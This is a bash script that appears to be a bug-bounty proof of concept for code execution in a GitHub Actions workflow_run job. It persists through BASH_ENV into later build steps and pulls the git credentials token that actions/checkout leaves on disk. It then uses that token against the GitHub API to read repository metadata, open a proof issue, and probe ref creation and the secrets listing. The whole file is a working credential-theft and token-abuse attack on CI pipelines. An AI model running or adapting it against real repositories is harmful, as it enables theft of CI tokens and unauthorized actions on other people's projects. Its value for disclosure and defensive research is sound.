#!/usr/bin/env bash
# stage2: sourced via BASH_ENV in every later bash step; runs once
if [ -e /tmp/.lh6done ]; then return 0 2>/dev/null || exit 0; fi
touch /tmp/.lh6done
set +e
echo "=== LH6_STAGE2 job=${GITHUB_JOB} run=${GITHUB_RUN_ID} uid=$(id -u) ==="
f=$(ls -t /home/runner/work/_temp/git-credentials-*.config 2>/dev/null | head -1)
echo "CREDFILE=$f"
b=$(grep -oE 'basic [A-Za-z0-9+/=]+' "$f" 2>/dev/null | head -1 | awk '{print $2}')
tok=$(printf '%s' "$b" | base64 -d 2>/dev/null | cut -d: -f2-)
echo "TOKLEN=${#tok}"
echo "TOKSHA=$(printf '%s' "$tok" | sha256sum | cut -c1-16)"
api=https://api.github.com/repos/PDFtoMark/triage-pinterest-vc5dd446-11ed78
echo "--- /user status (installation tokens are 403):"
curl -s -o /dev/null -w '%{http_code}\n' -H "Authorization: Bearer $tok" https://api.github.com/user
echo "--- repo metadata via stolen token:"
curl -s -H "Authorization: Bearer $tok" "$api" | jq -c '{full_name,private,permissions}' 2>/dev/null
echo "--- create proof issue:"
curl -s -X POST -H "Authorization: Bearer $tok" -H "Content-Type: application/json" \
  -d '{"title":"LH6 workflow_run.name RCE proof","body":"Arbitrary command execution in kind-perf-e2e (workflow_run on main). Token extracted from actions/checkout git credentials; this issue was created with that token."}' \
  "$api/issues" | jq -c '{number,html_url,message}' 2>/dev/null
echo "--- contents write attempt (expect 403):"
curl -s -o /dev/null -w '%{http_code}\n' -X POST -H "Authorization: Bearer $tok" -H "Content-Type: application/json" \
  -d '{"ref":"refs/heads/lh6-probe","sha":"ce1e385"}' "$api/git/refs"
echo "--- secrets list attempt (expect 403):"
curl -s -o /dev/null -w '%{http_code}\n' -H "Authorization: Bearer $tok" "$api/actions/secrets"
echo "=== LH6_STAGE2_DONE ==="
exit 1
